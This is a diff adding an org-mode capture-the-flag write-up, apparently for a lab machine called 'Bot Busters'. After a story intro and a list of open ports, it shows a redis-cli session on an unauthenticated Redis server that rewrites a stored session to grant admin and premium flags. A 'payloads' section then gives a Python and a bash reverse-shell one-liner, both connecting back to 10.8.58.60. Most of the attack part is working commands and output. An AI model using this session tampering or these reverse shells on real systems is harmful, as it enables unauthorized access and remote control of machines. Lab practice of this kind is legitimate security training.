@@ -1,0 +1,43 @@
+#+title: Bot Busters
+#+AUTHOR: gabriel
+
+* Intro
+Get ready for an exciting mission! You need to join an operation to complete a critical mission to detect a botnet group lurking in the dark corners of the cyber world.
+
+Recent cyber intelligence reports indicate that a group behind several DDoS attacks in the past is planning to launch several DDoS attacks in the near future. Many companies, institutions and organizations are known to be targeted. As a result of the analysis and research, a server used by the attackers was identified. It is thought that a botnet network is used through this server. We will reach the exact result after your research.
+
+You will start your mission to uncover these attackers who have caused many services to collapse and chaos to reign. In order to stop the cyber attackers behind these botnet attacks, you will first need to take over their botnet site and server. This will stop the attacks and identify who their targets are.
+
+This exciting mission will require the highest level of strategy and speed to use your technical knowledge to stop the cyber attack. Your courage, intelligence and skills will be the keys to combating the insidious threats of the cyber world.
+
+* open ports
+- 22
+- 80
+- 6379
+
+    *GEt and modify the cookie value at REdis* ->
+  #+begin_src sh
+[10:09][]~ ✮ redis-cli -h blackbot.hv
+blackbot.hv:6379> keys *
+1) "df7e0133-17b0-4430-a1ef-3c0edcc2d85a"
+blackbot.hv:6379> get df7e0133-17b0-4430-a1ef-3c0edcc2d85a
+"{\"userID\":\"fa6d90c4-feb0-4a9c-af59-05aa6d014476\",\"username\":\"jon\",\"isA
+dmin\":false,\"isPremium\":false}"
+blackbot.hv:6379> set ded8d036-0285-4930-a69d-e083e13761da "{\"userID\":\"4204da
+10-e68e-4020-8f68-c96d253bca71\",\"username\":\"jon\",\"isAdmin\":true,\"isPremi
+um\":true}"
+OK
+blackbot.hv:6379>
+  #+end_src
+
+*SEt new value at redis* ->
+: set ded8d036-0285-4930-a69d-e083e13761da "{\"userID\":\"4204da10-e68e-4020-8f68-c96d253bca71\",\"username\":\"jon\",\"isAdmin\":true,\"isPremium\":true}"
+
+
+** payloads
+
+*python3*
+: import sys,socket,os,pty;s=socket.socket();s.connect(("10.8.58.60",6969));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
+
+*bash*
+: bash -i >& /dev/tcp/10.8.58.60/7777 0>&1
